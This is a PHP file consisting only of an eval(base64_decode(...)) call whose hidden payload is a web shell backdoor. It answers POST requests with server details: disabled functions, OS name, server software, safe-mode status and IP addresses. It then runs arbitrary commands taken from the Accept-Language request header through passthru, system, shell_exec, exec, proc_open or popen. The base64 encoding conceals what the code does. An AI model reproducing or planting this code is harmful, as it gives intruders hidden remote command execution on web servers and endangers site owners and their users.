<?php eval(base64_decode("c2V0X3RpbWVfbGltaXQoMCk7DQplcnJvcl9yZXBvcnRpbmcoMCk7DQppZiAoaXNzZXQoJF9QT1NUWydkaXNhYmxlX2Z1bmN0aW9ucyddKSkgew0KICAgIGVjaG8gKCFlbXB0eShpbmlfZ2V0KCdkaXNhYmxlX2Z1bmN0aW9ucycpKSA/IGluaV9nZXQoJ2Rpc2FibGVfZnVuY3Rpb25zJykgOiAnTk9ORScpOw0KICAgIGRpZSgpOw0KfQ0KaWYgKGlzc2V0KCRfUE9TVFsndW5hbWVhJ10pKSB7DQogICAgZWNobyBwaHBfdW5hbWUoJ2EnKTsNCiAgICBkaWUoKTsNCn0NCmlmIChpc3NldCgkX1BPU1RbJ3NlcnZlciddKSkgew0KICAgIGVjaG8gKCFlbXB0eShnZXRlbnYoJ1NFUlZFUl9TT0ZUV0FSRScpKSkgPyBnZXRlbnYoJ1NFUlZFUl9TT0ZUV0FSRScpIDogJyc7DQogICAgZGllKCk7DQp9DQppZiAoaXNzZXQoJF9QT1NUWydzYWZlX21vZGUnXSkpIHsNCiAgICBlY2hvIChpbmlfZ2V0KCdzYWZlX21vZGUnKSA9PSAxKSA/ICdPTicgOiAnT0ZGJzsNCiAgICBkaWUoKTsNCn0NCmlmIChpc3NldCgkX1BPU1RbJ3NlcnZlcl9pcCddKSkgew0KICAgIGVjaG8gKCFlbXB0eShnZXRlbnYoJ1NFUlZFUl9BRERSJykpKSA/IGdldGVudignU0VSVkVSX0FERFInKSA6ICcnOw0KICAgIGRpZSgpOw0KfQ0KaWYgKGlzc2V0KCRfUE9TVFsnY2xpZW50X2lwJ10pKSB7DQogICAgZWNobyAoIWVtcHR5KGdldGVudignUkVNT1RFX0FERFInKSkpID8gZ2V0ZW52KCdSRU1PVEVfQUREUicpIDogJyc7DQogICAgZGllKCk7DQp9DQppZiAoJF9QT1NUWydjbWQnXSA9PSAicGFzc3RocnUiKSB7DQogICAgcGFzc3RocnUoJF9TRVJWRVJbJ0hUVFBfQUNDRVBUX0xBTkdVQUdFJ10pOw0KfSBlbHNlaWYgKCRfUE9TVFsnY21kJ10gPT0gInN5c3RlbSIpIHsNCiAgICBzeXN0ZW0oJF9TRVJWRVJbJ0hUVFBfQUNDRVBUX0xBTkdVQUdFJ10pOw0KfSBlbHNlaWYgKCRfUE9TVFsnY21kJ10gPT0gInNoZWxsX2V4ZWMiKSB7DQogICAgZWNobyBzaGVsbF9leGVjKCRfU0VSVkVSWydIVFRQX0FDQ0VQVF9MQU5HVUFHRSddKTsNCn0gZWxzZWlmICgkX1BPU1RbJ2NtZCddID09ICJleGVjIikgew0KICAgIGVjaG8gZXhlYygkX1NFUlZFUlsnSFRUUF9BQ0NFUFRfTEFOR1VBR0UnXSk7DQp9IGVsc2VpZiAoJF9QT1NUWydjbWQnXSA9PSAicHJvY19vcGVuIikgew0KICAgICRkZXNjcmlwdG9yc3BlYyA9IGFycmF5KA0KICAgICAgICAwID0+IGFycmF5KCJwaXBlIiwgInIiKSwNCiAgICAgICAgMSA9PiBhcnJheSgicGlwZSIsICJ3IiksDQogICAgICAgIDIgPT4gYXJyYXkoInBpcGUiLCAidyIpDQogICAgKTsNCg0KICAgICRwcm9jZXNzID0gcHJvY19vcGVuKCRfU0VSVkVSWydIVFRQX0FDQ0VQVF9MQU5HVUFHRSddLCAkZGVzY3JpcHRvcnNwZWMsICRwaXBlcyk7DQogICAgaWYgKGlzX3Jlc291cmNlKCRwcm9jZXNzKSkgew0KICAgICAgICBmY2xvc2UoJHBpcGVzWzBdKTsgICAgICAgIA0KICAgICAgICAkb3V0cHV0ID0gc3RyZWFtX2dldF9jb250ZW50cygkcGlwZXNbMV0pOw0KICAgICAgICBmY2xvc2UoJHBpcGVzWzFdKTsgICAgICAgDQogICAgICAgICRlcnJvciA9IHN0cmVhbV9nZXRfY29udGVudHMoJHBpcGVzWzJdKTsNCiAgICAgICAgZmNsb3NlKCRwaXBlc1syXSk7ICAgICAgICANCiAgICAgICAgcHJvY19jbG9zZSgkcHJvY2Vzcyk7DQogICAgICAgIGVjaG8gJG91dHB1dDsNCiAgICAgICAgaWYgKCFlbXB0eSgkZXJyb3IpKSB7DQogICAgICAgICAgICBlY2hvICJFcnJvcjogIiAuICRlcnJvcjsNCiAgICAgICAgfQ0KICAgIH0NCn0gZWxzZWlmICgkX1BPU1RbJ2NtZCddID09ICJwb3BlbiIpIHsNCiAgICAkaGFuZGxlID0gcG9wZW4oJF9TRVJWRVJbJ0hUVFBfQUNDRVBUX0xBTkdVQUdFJ10sICdyJyk7DQogICAgaWYgKCRoYW5kbGUpIHsNCiAgICAgICAgd2hpbGUgKCFmZW9mKCRoYW5kbGUpKSB7DQogICAgICAgICAgICBlY2hvIGZyZWFkKCRoYW5kbGUsIDgxOTIpOw0KICAgICAgICB9DQogICAgICAgIHBjbG9zZSgkaGFuZGxlKTsNCiAgICB9DQp9DQoNCg=="));